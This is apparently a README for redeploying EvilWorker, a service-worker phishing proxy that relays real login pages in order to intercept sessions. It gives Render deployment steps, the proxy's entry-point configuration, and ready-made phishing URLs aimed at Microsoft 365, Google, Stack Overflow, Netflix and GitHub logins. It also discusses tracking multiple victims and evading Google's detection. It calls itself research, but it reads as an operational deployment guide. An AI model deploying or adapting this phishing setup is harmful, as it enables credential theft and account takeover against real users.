# Original EvilWorker Implementation

This is the **exact original EvilWorker implementation** from [Antoine HAZEBROUCK's repository](https://github.com/Ahaz1701/EvilWorker.git) with **zero modifications**.

## 🎯 Purpose

This deployment is specifically for testing Google compatibility using the author's exact implementation to see if the original code works better with Google's security measures.

## 📋 Original Implementation Details

### Files (Unmodified):
- `proxy_server.js` - Original proxy server
- `index_smQGUDpTF7PN.html` - Original phishing page
- `service_worker_Mz8XO2ny1Pg5.js` - Original service worker
- `script_Vx9Z6XN5uC3k.js` - Original client script
- `404_not_found_lk48ZVr32WvU.html` - Original 404 page
- `decrypt_log_file.js` - Original log decryption utility

### Configuration (Original):
```javascript
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const REDIRECT_URL = "https://www.intrinsec.com/";
```

## 🚀 Deployment Instructions

### Method 1: Manual Render Deployment
1. Go to [Render Dashboard](https://dashboard.render.com)
2. Click "New +" → "Web Service"
3. Connect GitHub repository: `Billoxinogen18/evilworker-original-google`
4. Configure:
   - **Name:** `evilworker-original-google`
   - **Branch:** `main`
   - **Build Command:** `npm install`
   - **Start Command:** `node proxy_server.js`
   - **Health Check Path:** `/`
   - **Plan:** Free

### Method 2: Use Deployment Script
```bash
./deploy-original.sh
```

## 🧪 Testing URLs

After deployment, test these URLs with the original implementation:

### Microsoft Office 365
```
https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

### Google Accounts
```
https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F
```

### Stack Overflow
```
https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fstackoverflow.com%2F
```

### Netflix
```
https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fwww.netflix.com%2F
```

### GitHub
```
https://your-service.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fgithub.com%2F
```

## 🔍 Key Differences from Modified Version

### Original Implementation:
- ✅ **No short URLs** (`/c`, `/p`, `/g`) - uses direct phishing URLs
- ✅ **Single client ID** - uses Microsoft's client ID for all services
- ✅ **Original redirect URL** - points to `intrinsec.com`
- ✅ **No health check endpoint** - uses root path `/`
- ✅ **Original file names** - exactly as author intended
- ✅ **No Google-specific headers** - uses original proxy logic

### Expected Behavior:
- **Microsoft Office 365:** Should work perfectly (as in author's demo)
- **Google:** May still show security warnings (testing original approach)
- **Other Services:** Should work as demonstrated in author's video

## 📊 Comparison Testing

This deployment allows us to compare:

1. **Original vs Modified:** See if our modifications helped or hurt Google compatibility
2. **Google Security:** Test if the original implementation bypasses Google's detection
3. **Service Compatibility:** Verify which services work with the original code
4. **Performance:** Compare response times and success rates

## 🎥 Author's Demo

The original author demonstrated this working with:
- Microsoft Office 365 ✅
- Stack Overflow ✅  
- Netflix ✅
- GitHub ✅

**Google was not specifically tested in the original demo.**

## 🔧 Technical Details

### Original Architecture:
- **Service Worker:** Registers immediately on page load
- **Proxy Server:** Forwards all requests to legitimate services
- **Session Management:** Tracks multiple victims simultaneously
- **Logging:** Encrypts all intercepted communications
- **PaaS Compatible:** Works on Azure Web Apps, Render, etc.

### Original Limitations:
- No short URL system
- Single client ID for all services
- No health check endpoint
- No Google-specific optimizations

## 📝 Notes

This is a **pure research deployment** to test the original author's implementation against Google's security measures. No modifications have been made to ensure we're testing the exact same code the author used in their demonstrations.

**Repository:** https://github.com/Billoxinogen18/evilworker-original-google
**Original Author:** Antoine HAZEBROUCK
**Original Repository:** https://github.com/Ahaz1701/EvilWorker.git
